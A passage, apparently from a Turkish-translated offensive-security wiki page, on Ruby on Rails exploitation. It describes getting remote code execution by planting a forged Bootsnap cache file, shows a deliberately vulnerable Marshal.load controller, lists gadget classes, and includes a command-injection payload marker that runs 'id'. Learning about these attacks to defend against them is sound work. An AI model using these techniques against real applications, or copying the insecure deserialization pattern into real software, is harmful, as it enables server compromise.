Bootsnap, derlenmiş Ruby kodunu, YAML ve JSON dosyalarını önbelleğe alarak Rails başlatma sürelerini hızlandırır. Ruby sürümü, dosya boyutu, mtime, derleme seçenekleri gibi alanları içeren bir önbellek anahtarı başlığı ile birlikte derlenmiş kodu içeren önbellek dosyalarını saklar. Bu başlık, uygulama başlangıcında önbelleği doğrulamak için kullanılır.

- Dosya Meta Verilerini Toplayın

Saldırgan, Rails başlangıcında muhtemelen yüklenen bir hedef dosyayı (örneğin, Ruby'nin standart kütüphanesinden set.rb) seçer. Konteyner içinde Ruby kodu çalıştırarak, kritik meta verileri (RUBY_VERSION, RUBY_REVISION, boyut, mtime ve compile_option gibi) çıkarır. Bu veriler, geçerli bir önbellek anahtarı oluşturmak için gereklidir.

- Önbellek Dosyası Yolunu Hesaplayın

Bootsnap’ın FNV-1a 64-bit hash mekanizmasını taklit ederek, doğru önbellek dosyası yolu belirlenir. Bu adım, kötü niyetli önbellek dosyasının Bootsnap'ın beklediği yere tam olarak yerleştirildiğinden emin olur (örneğin, tmp/cache/bootsnap/compile-cache-iseq/ altında).

- Kötü Niyetli Önbellek Dosyasını Oluşturun

Saldırgan, aşağıdakileri yapan bir yük hazırlamaktadır:

- Keyfi komutları çalıştırır (örneğin, işlem bilgilerini göstermek için id çalıştırmak).
- Kötü niyetli önbelleği çalıştırmadan sonra kaldırır, böylece yinelemeli istismar önlenir.
- Uygulamanın çökmesini önlemek için orijinal dosyayı (örneğin, set.rb) yükler.

Bu yük, ikili Ruby koduna derlenir ve daha önce toplanan meta veriler ve Bootsnap için doğru sürüm numarası kullanılarak dikkatlice oluşturulmuş bir önbellek anahtarı başlığı ile birleştirilir.

- Üzerine Yazın ve Çalıştırmayı Tetikleyin
Keyfi dosya yazma zafiyetini kullanarak, saldırgan oluşturulan önbellek dosyasını hesaplanan konuma yazar. Ardından, bir sunucu yeniden başlatmasını tetikler (Puma tarafından izlenen tmp/restart.txt dosyasına yazarak). Yeniden başlatma sırasında, Rails hedef dosyayı gerektirdiğinde, kötü niyetli önbellek dosyası yüklenir ve uzaktan kod yürütme (RCE) ile sonuçlanır.

### Ruby Marshal exploitation in practice (updated)

Güvenilmeyen baytların `Marshal.load`/`marshal_load`'a ulaştığı herhangi bir yolu RCE kaynağı olarak değerlendirin. Marshal, keyfi nesne grafikleri yeniden yapılandırır ve malzeme haline getirme sırasında kütüphane/gem geri çağırmalarını tetikler.

- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Gerçek zincirlerde görülen yaygın gadget sınıfları: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Payload'larda gömülü tipik yan etki işareti (unmarshal sırasında yürütülür):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Gerçek uygulamalarda nerede ortaya çıkıyor:
- Tarihsel olarak Marshal kullanan Rails önbellek depoları ve oturum depoları
- Arka plan iş arka uçları ve dosya destekli nesne depoları
- İkili nesne blob'larının herhangi bir özel kalıcılığı veya taşınması

Endüstriyel cihaz keşfi:
- Yapıcılar, `hash`, `_load`, `init_with` veya unmarshal sırasında çağrılan yan etkili yöntemler için Grep kullanın
- Kaynakları → varış noktalarına izlemek ve cihazları ortaya çıkarmak için CodeQL’nin Ruby güvensiz deserialization sorgularını kullanın
- Kamuya açık çok formatlı PoC'lerle doğrulayın (JSON/XML/YAML/Marshal)

## Referanslar

- Trail of Bits – Marshal deliliği: Ruby deserialization istismarlarının kısa tarihi: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Evrensel RCE Deserialization Gadget Zinciri: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal zinciri: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 güvensiz deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – Ruby on Rails Active Storage güvensiz deserialization ile RCE: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Rubyland'de gadget zincirlerini keşfetmek: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
- GitHub Security Lab – Ruby güvensiz deserialization (sorgu yardımı): https://codeql.github.com/codeql-query-help/ruby/rb-unsafe-deserialization/
- GitHub Security Lab – PoC'ler deposu: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization
- Doyensec PR – Ruby 3.4 gadget: https://github.com/GitHubSecurityLab/ruby-unsafe-deserialization/pull/1
- Luke Jahnke – Ruby 3.4 evrensel zincir: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Luke Jahnke – Gem::SafeMarshal kaçışı: https://nastystereo.com/security/ruby-safe-marshal-escape.html
- Ruby 3.4.0-rc1 sürümü: https://github.com/ruby/ruby/releases/tag/v3_4_0_rc1
- Ruby düzeltme PR #12444: https://github.com/ruby/ruby/pull/12444
- Trail of Bits – RubyGems.org'u denetleme (Marshal bulguları): https://blog.trailofbits.com/2024/12/11/auditing-the-ruby-ecosystems-central-package-repository/

{{#include ../../banners/hacktricks-training.md}}
